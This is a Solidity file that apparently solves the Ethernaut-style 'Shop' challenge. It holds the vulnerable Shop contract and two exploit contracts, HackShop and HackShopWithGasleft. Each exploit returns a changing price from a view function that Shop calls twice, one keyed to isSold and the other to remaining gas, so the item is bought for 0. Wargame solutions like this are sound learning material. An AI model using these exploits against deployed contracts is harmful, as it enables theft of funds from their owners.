// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract HackShop is Buyer {
  Shop public shop;

  function price() external override view returns (uint) {
    return shop.isSold() ? 0: 100;
  }

  function buy(address shop_) public {
    shop = Shop(shop_);
    shop.buy();
  }
}

/** @dev you can hack Shop contract even if `isSold = true` statement is declared last. */
contract HackShopWithGasleft is Buyer {
  Shop public shop;

  function price() external override view returns (uint) {
      uint256 gas = gasleft();
        // remaining gas after call price() twice is 10379
        // note that gas can be slightly different depending on compiler version and optimizer settings
      if(gas < 10380) {
          return 0;
      } else {
          return gas;
      }
  }

  function buy(address shop_) public {
    shop = Shop(shop_);
    shop.buy();
  }
}